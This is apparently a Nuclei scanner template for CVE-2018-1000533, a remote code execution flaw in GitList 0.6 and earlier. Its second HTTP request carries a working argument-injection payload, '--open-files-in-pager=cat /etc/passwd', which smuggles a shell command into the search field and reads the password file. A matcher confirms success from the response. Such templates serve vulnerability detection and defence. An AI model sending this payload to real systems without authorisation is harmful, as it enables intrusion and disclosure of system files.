id: CVE-2018-1000533
info:
  author: pikpikcu
  description: klaussilveira GitList version <= 0.6 contains a Passing incorrectly
    sanitized input to system function vulnerability in `searchTree` function that
    can result in Execute any code as PHP user.
  name: GitList < 0.6.0 RCE
  reference: https://github.com/vulhub/vulhub/tree/master/gitlist/CVE-2018-1000533
  severity: critical
  tags: rce,git,cve,cve2018,gitlist
requests:
- extractors:
  - group: 1
    internal: true
    name: path
    part: body
    regex:
    - <span class="name">(.*?)</span>
    type: regex
  matchers:
  - part: body
    type: word
    words:
    - root:/root:/bin/bash
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /{{path}}/tree/a/search HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    Content-Length: 45

    Content-Type: application/x-www-form-urlencoded


    query=--open-files-in-pager=cat%20/etc/passwd

    '
